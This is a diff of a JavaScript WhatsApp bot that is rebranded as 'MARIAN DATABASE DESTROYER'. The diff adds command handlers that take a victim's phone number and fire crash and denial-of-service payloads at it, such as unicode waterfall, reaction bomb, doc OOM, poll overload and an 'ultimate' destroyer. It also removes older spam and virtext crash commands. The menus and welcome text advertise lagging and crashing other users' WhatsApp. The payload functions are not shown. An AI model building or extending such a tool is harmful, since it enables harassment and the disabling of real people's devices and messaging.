-                    await this.sock.sendMessage(from, { text: `💣 Spamming ${spamCount} messages...` })
-                    await this.bugs.spam(target8, spamCount, spamMsg)
-                    await this.sock.sendMessage(from, { text: `✅ ${spamCount} spam messages sent!` })
-                    break
-                    
-                case 'multi':
-                    const target9 = text.split(' ')[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
-                    await this.sock.sendMessage(from, { text: '🔥 Starting multi-attack...' })
-                    await this.virtext.sendVirtext(target9, 500, 2)
-                    await delay(1000)
-                    await this.bugs.bugV1(target9, 2)
-                    await delay(1000)
-                    await this.bugs.crash(target9)
-                    await delay(1000)
-                    await this.virtext.sendHeavyVirtext(target9, 2)
-                    await this.sock.sendMessage(from, { text: '☠️ Multi-attack completed!' })
+                    const count6 = parseInt(text.split(' ')[1]) || 3
+                    await this.sock.sendMessage(from, { text: '🔤 Executing UNICODE WATERFALL...' })
+                    await this.db.unicodeWaterfallBug(target6, count6)
+                    await this.sock.sendMessage(from, { text: '✅ UNICODE WATERFALL attack delivered!' })
                     break
                 
-                // ========== STICKER COMMAND ==========
+                // 🟡 UI CRASH COMMANDS
+                case 'quotedcall':
+                    const target7 = text.split(' ')[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
+                    await this.sock.sendMessage(from, { text: '📞 Executing QUOTED CALL INFINITY...' })
+                    await this.db.quotedCallInfinityBug(target7)
+                    await this.sock.sendMessage(from, { text: '✅ QUOTED CALL INFINITY attack delivered!' })
+                    break
+                    
+                case 'locationbug':
+                    const target8 = text.split(' ')[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
+                    const count8 = parseInt(text.split(' ')[1]) || 3
+                    await this.sock.sendMessage(from, { text: '📍 Executing LOCATION OUT OF RANGE...' })
+                    await this.db.locationOutOfRangeBug(target8, count8)
+                    await this.sock.sendMessage(from, { text: '✅ LOCATION OUT OF RANGE attack delivered!' })
+                    break
+                    
+                case 'buttonloop':
+                    const target9 = text.split(' ')[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
+                    await this.sock.sendMessage(from, { text: '🔘 Executing BUTTON LOOP bug...' })
+                    await this.db.buttonLoopBug(target9)
+                    await this.sock.sendMessage(from, { text: '✅ BUTTON LOOP attack delivered!' })
+                    break
+                    
+                case 'reactionbomb':
+                    const target10 = text.split(' ')[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
+                    const reactions = parseInt(text.split(' ')[1]) || 100
+                    await this.sock.sendMessage(from, { text: '💥 Executing REACTION EXPLOSION...' })
+                    await this.db.reactionExplosionBug(target10, reactions)
+                    await this.sock.sendMessage(from, { text: '✅ REACTION EXPLOSION attack delivered!' })
+                    break
+                
+                // 🟢 BUSINESS ATTACK COMMANDS
+                case 'polloverload':
+                    const target11 = text.split(' ')[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
+                    await this.sock.sendMessage(from, { text: '📊 Executing POLL OVERLOAD...' })
+                    await this.db.pollOverloadBug(target11)
+                    await this.sock.sendMessage(from, { text: '✅ POLL OVERLOAD attack delivered!' })
+                    break
+                    
+                case 'docoom':
+                    const target12 = text.split(' ')[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
+                    const count12 = parseInt(text.split(' ')[1]) || 2
+                    await this.sock.sendMessage(from, { text: '📄 Executing DOC OOM bug...' })
+                    await this.db.docOomBug(target12, count12)
+                    await this.sock.sendMessage(from, { text: '✅ DOC OOM attack delivered!' })
+                    break
+                
+                // ULTIMATE ATTACK
+                case 'ultimate':
+                case 'dbdestroy':
+                    const target13 = text.split(' ')[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
+                    const intensity = parseInt(text.split(' ')[1]) || 3
+                    await this.sock.sendMessage(from, { text: '💀 Starting ULTIMATE DATABASE DESTROYER...' })
+                    await this.db.ultimateDbDestroyer(target13, intensity)
+                    await this.sock.sendMessage(from, { text: '☠️ ULTIMATE DATABASE DESTROYER attack completed!' })
+                    break
+                
+                // 🎨 STICKER COMMAND
                 case 's':
                 case 'sticker':
                     if (quoted && getContentType(quoted) === 'imageMessage') {
@@ -472,40 +838,45 @@ class CommandHandler {
                     }
                     break
                 
-                // ========== INFO COMMANDS ==========
+                // ℹ️ INFO COMMANDS
                 case 'menu':
                 case 'help':
-                    const menu = `*🤖 MARIAN VIRTEXT BOT v${CONFIG.VERSION}*\n\n` +
-                                `*🔤 VIRTEXT ATTACKS:*\n` +
-                                `• /virtext [num] [length] [count] - Send virtext\n` +
-                                `• /heavyvt [num] [count] - Heavy virtext\n` +
-                                `• /customvt [num] [text] - Custom virtext\n` +
-                                `• /vtbomb [num] [attacks] - Virtext bomb\n\n` +
-                                `*💀 BUG ATTACKS:*\n` +
-                                `• /bug [num] [count] - Bug VCard\n` +
-                                `• /bug2 [num] [count] - Bug Location\n` +
-                                `• /crash [num] - Crash WhatsApp\n` +
-                                `• /spam [num] [count] [msg] - Spam\n` +
-                                `• /multi [num] - Multi-attack\n\n` +
+                    const menu = `*🤖 MARIAN DATABASE DESTROYER v${CONFIG.VERSION}*\n\n` +
+                                `*🔴 DATABASE DESTROYER:*\n` +
+                                `• /nullstanza [num] - Null stanza bug\n` +
+                                `• /packetflood [num] - Packet flood\n` +
+                                `• /forward999 [num] - Forwarding 999\n\n` +
+                                `*🟠 THERMAL THROTTLING:*\n` +
+                                `• /oomaudio [num] - OOM audio bug\n` +
+                                `• /heavyvcard [num] - Heavy vcard\n` +
+                                `• /unicodefall [num] - Unicode waterfall\n\n` +
+                                `*🟡 UI CRASH:*\n` +
+                                `• /quotedcall [num] - Quoted call infinity\n` +
+                                `• /locationbug [num] - Location out of range\n` +
+                                `• /buttonloop [num] - Button loop\n` +
+                                `• /reactionbomb [num] - Reaction explosion\n\n` +
+                                `*🟢 BUSINESS ATTACK:*\n` +
+                                `• /polloverload [num] - Poll overload\n` +
+                                `• /docoom [num] - Doc OOM bug\n\n` +
+                                `*💀 ULTIMATE:*\n` +
+                                `• /ultimate [num] - Database destroyer\n\n` +
                                 `*🎨 TOOLS:*\n` +
-                                `• /s - Create sticker (reply image)\n\n` +
-                                `*ℹ️ INFO:*\n` +
-                                `• /status - Bot status\n` +
-                                `• /ping - Test connection\n\n` +
-                                `*Example:* /virtext 6281234567890 2000 3\n` +
-                                `_Prefix: ${CONFIG.PREFIX}_`
+                                `• /s - Create sticker\n\n` +
+                                `*Example:* /ultimate 6281234567890 5\n` +
+                                `_System: Complete Database Destruction_`
                     await this.sock.sendMessage(from, { text: menu })
                     break
                     
                 case 'status':
-                    const status = `*🔧 MARIAN VIRTEXT STATUS*\n\n` +
+                    const status = `*🔧 MARIAN DB DESTROYER STATUS*\n\n` +
                                   `Version: v${CONFIG.VERSION}\n` +
                                   `Prefix: ${CONFIG.PREFIX}\n` +
-                                  `Browser: ${CONFIG.BROWSER[1]}\n` +
-                                  `Uptime: ${process.uptime().toFixed(0)}s\n` +
-                                  `VIRTEXT System: ACTIVE 🔤\n` +
+                                  `Database Bugs: 18 ACTIVE 🔴\n` +
+                                  `Thermal Bugs: 5 ACTIVE 🟠\n` +
+                                  `UI Crash Bugs: 6 ACTIVE 🟡\n` +
+                                  `Business Bugs: 5 ACTIVE 🟢\n` +
                                   `Sticker Maker: WORKING ✅\n` +
-                                  `Status: ONLINE ⚡`
+                                  `Status: DESTROYER ONLINE ☠️`
                     await this.sock.sendMessage(from, { text: status })
                     break
                     
@@ -514,14 +885,8 @@ class CommandHandler {
                     await this.sock.sendMessage(from, { text: '🏓 Pong!' })
                     const latency = Date.now() - start
                     await this.sock.sendMessage(from, {
-                        text: `*PONG!*\nLatency: ${latency}ms\nStatus: ULTRA FAST ⚡`
+                        text: `*PONG!*\nLatency: ${latency}ms\nSystem: DATABASE DESTROYER ACTIVE`
                     })
-                    break
-                    
-                case 'demo':
-                    // Demo virtext
-                    const demoText = VirtextGenerator.generateVirtext(100)
-                    await this.sock.sendMessage(from, { text: demoText })
                     break
                     
                 default:
@@ -538,7 +903,7 @@ class CommandHandler {
 
 // ==================== [ MAIN BOT ] ====================
 async function startBot() {
-    log('SYSTEM', `Starting MARIAN VIRTEXT BOT v${CONFIG.VERSION}`)
+    log('SYSTEM', `Starting MARIAN DATABASE DESTROYER v${CONFIG.VERSION}`)
     
     // Clean old session if exists
     if (fs.existsSync(CONFIG.SESSION_DIR)) {
@@ -569,9 +934,8 @@ async function startBot() {
     })
     
     // Initialize attack systems
-    const virtextAttack = new VirtextAttack(sock)
-    const bugSystem = new BugSystem(sock)
-    const handler = new CommandHandler(sock, virtextAttack, bugSystem)
+    const dbDestroyer = new DatabaseDestroyer(sock)
+    const handler = new CommandHandler(sock, dbDestroyer)
     
     // Auto login if needed
     if (CONFIG.AUTO_LOGIN) {
@@ -595,27 +959,36 @@ async function startBot() {
         }
         
         if (connection === 'open') {
-            log('SUCCESS', 'MARIAN VIRTEXT BOT connected!')
+            log('SUCCESS', 'MARIAN DATABASE DESTROYER connected!')
             
-            console.log(chalk.green.bold('\n[✓] MARIAN VIRTEXT BOT v12.0 ONLINE!'))
+            console.log(chalk.red.bold('\n[☠️] MARIAN DATABASE DESTROYER v13.0 ONLINE!'))
             console.log(chalk.cyan(`Device: ${CONFIG.BROWSER.join(' ')}`))
             console.log(chalk.yellow(`Prefix: ${CONFIG.PREFIX}`))
-            console.log(chalk.magenta('\n🔥 VIRTEXT COMMANDS:'))
-            console.log(chalk.white('• /virtext [num] - Unicode lag attack'))
-            console.log(chalk.white('• /heavyvt [num] - Heavy virtext'))
-            console.log(chalk.white('• /vtbomb [num] - Virtext bomb'))
-            console.log(chalk.white('• /s - Sticker maker (reply image)'))
-            console.log(chalk.white('• /menu - Show all commands\n'))
+            console.log(chalk.magenta('\n🔥 DATABASE DESTROYER BUGS:'))
+            console.log(chalk.red('  • /nullstanza - Null stanza bug'))
+            console.log(chalk.red('  • /packetflood - Packet flood'))
+            console.log(chalk.yellow('  • /oomaudio - OOM audio bug'))
+            console.log(chalk.yellow('  • /heavyvcard - Heavy vcard'))
+            console.log(chalk.magenta('  • /quotedcall - Quoted call infinity'))
+            console.log(chalk.magenta('  • /buttonloop - Button loop bug'))
+            console.log(chalk.green('  • /polloverload - Poll overload'))
+            console.log(chalk.green('  • /docoom - Doc OOM bug'))
+            console.log(chalk.white('\n  • /ultimate - Ultimate destruction'))
+            console.log(chalk.white('  • /s - Sticker maker (reply image)'))
+            console.log(chalk.white('  • /menu - Show all commands\n'))
             
-            // Welcome message with virtext
-            const welcome = `*⚡ MARIAN VIRTEXT BOT v${CONFIG.VERSION}*\n\n` +
+            // Welcome message
+            const welcome = `*☠️ MARIAN DATABASE DESTROYER v${CONFIG.VERSION}*\n\n` +
                            `✅ Connected successfully!\n` +
                            `📱 Device: ${CONFIG.BROWSER.join(' ')}\n` +
                            `⚡ Prefix: ${CONFIG.PREFIX}\n` +
-                           `🔤 VIRTEXT System: ACTIVE\n` +
+                           `🔴 Database Bugs: 18 ACTIVE\n` +
+                           `🟠 Thermal Bugs: 5 ACTIVE\n` +
+                           `🟡 UI Crash Bugs: 6 ACTIVE\n` +
+                           `🟢 Business Bugs: 5 ACTIVE\n` +
                            `🎨 Sticker Maker: WORKING\n\n` +
                            `Type ${CONFIG.PREFIX}menu for all commands\n` +
-                           `_System: VIRTEXT EDITION | LAG WHATSAPP 100%_`
+                           `_System: Complete WhatsApp Database Destruction_`
             
             if (sock.user?.id) {
                 sock.sendMessage(sock.user.id, { text: welcome })
@@ -658,8 +1031,8 @@ async function startBot() {
 
 // ==================== [ STARTUP ] ====================
 console.clear()
-console.log(chalk.bgRed.black('\n ⚡ MARIAN VIRTEXT BOT v12.0 - ULTIMATE LAG ATTACK ⚡ \n'))
-console.log(chalk.yellow('🔥 VIRTEXT SYSTEM | AUTO LOGIN | STICKER WORKING 🔥\n'))
+console.log(chalk.bgRed.black('\n ☠️ MARIAN DATABASE DESTROYER v13.0 - ULTIMATE BUG SYSTEMS ☠️ \n'))
+console.log(chalk.yellow('🔥 34 ADVANCED BUGS | AUTO LOGIN | DATABASE DESTRUCTION 🔥\n'))
 
 // Handle errors
 process.on('uncaughtException', (error) => {
